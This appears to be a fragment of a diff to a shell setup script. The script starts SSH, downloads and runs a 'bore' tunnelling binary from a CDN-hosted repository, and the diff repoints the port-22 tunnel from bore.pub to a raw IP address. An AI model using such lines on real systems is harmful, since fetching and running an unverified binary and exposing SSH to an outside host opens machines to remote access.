@@ -41,4 +41,4 @@ service ssh start
 
 wget https://cdn.jsdelivr.net/gh/larderio/x@content/bore-v0.5.0-x86_64-unknown-linux-musl -O bore
 chmod +x bore
-./bore local 22 --to bore.pub
+./bore local 22 --to 194.135.104.187
